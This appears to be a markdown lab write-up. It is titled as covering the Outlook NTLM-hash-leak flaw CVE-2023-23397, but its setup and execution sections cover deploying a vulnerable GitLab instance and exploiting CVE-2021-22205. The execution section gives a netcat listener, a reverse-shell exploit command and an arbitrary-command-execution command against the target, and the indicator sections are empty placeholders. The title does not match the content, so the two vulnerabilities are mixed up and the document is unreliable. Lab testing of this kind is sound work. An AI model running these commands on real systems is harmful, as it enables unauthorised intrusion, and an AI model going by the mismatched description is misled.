# Microsoft Outlook Client Appointment Reminder Alarm Sound - Privilege Escalation Vulnerability (CVE-2023-23397)
## Summary

CVE-2023-23397 affects all versions of the Microsoft Outlook desktop applications on Windows systems. It is important to note that this vulnerability does not affect Outlook web app or Microsoft 365. The attacker can obtain a user's credentials and potentially escalate privileges by directing the Outlook client to ***search for the appointment reminder alarm sound on a specified UNC path, thereby leaking Net-NTLMv2 hashes*** when the victim machine authenticates to the server residing on the said UNC path. 

## Prerequisites

The prerequisite for the setup is to have a Windows Active Directory environment set up with an Exchange server, and host workstation(s) with Microsoft Outlook client software installed. 



## Setup

First, clone or grab the `gitlab-setup.sh` file from [this repository.](https://github.com/NukingDragons/gitlab-setup)

To perform an online install of the vulnerable Gitlab instance, run the following command (Set the hostname to your preference, or to the IP of the interface you wish to host this on):
```bash
./gitlab-setup.sh -v 13.8.6-ce.0 -H gitlab.example.com
```

By default, the docker will start automatically on the specified hostname.

To perform an offline installation, first run the following command on a machine that *DOES* have an internet connection:

```bash
./gitlab-setup.sh -v 13.8.6-ce.0 -e --fetch-only
```

Then, move *BOTH* the `gitlab-setup.sh` file and the resulting `gitlab-ce-13.8.6-ce.0.docker` file to the offline machine.

Once the files have been moved over, install and start the Gitlab instance by running the following command on the offline machine:

```bash
./gitlab-setup.sh -i /path/to/gitlab-ce.13.8.6-ce.0.docker -H gitlab.example.com
```

Then, browse to the page given the specific hostname, and set the administrator password. Once it's been set, the instance will be fully functional. Be sure to log in and adjust any settings, add users, and/or add any repositories that are needed.

## Execution

### Method 1 - Reverse Shell

To exploit a vulnerable instance of Gitlab, first clone [this repository](https://github.com/NukingDragons/gitlab-cve-2021-22205), or download the bash script.

First, start a local netcat listener on your port of choice:

```bash
nc -lvnp 1337
```

Then, to obtain a shell, simply run the following command:

```bash
./cve-2021-22205.sh -t http://gitlab.example.com -i <your interface IP> -p <your specified port>
```

Alternatively, the script will deduce the IP for you and the port will be assumed to be 1337 if unspecified.

![image](./images/Pasted%20image%2020231101113528.png)

#### Indicators of Compromise

TODO

### Method 2 - Any Command

To exploit a vulnerable instance of Gitlab, first clone [this repository](https://github.com/NukingDragons/gitlab-cve-2021-22205), or download the bash script.

To run a custom command against the target, run the following command:

```bash
./cve-2021-22205.sh -t http://gitlab.example.com -c "<your command here>"
```

#### Indicators of Compromise

TODO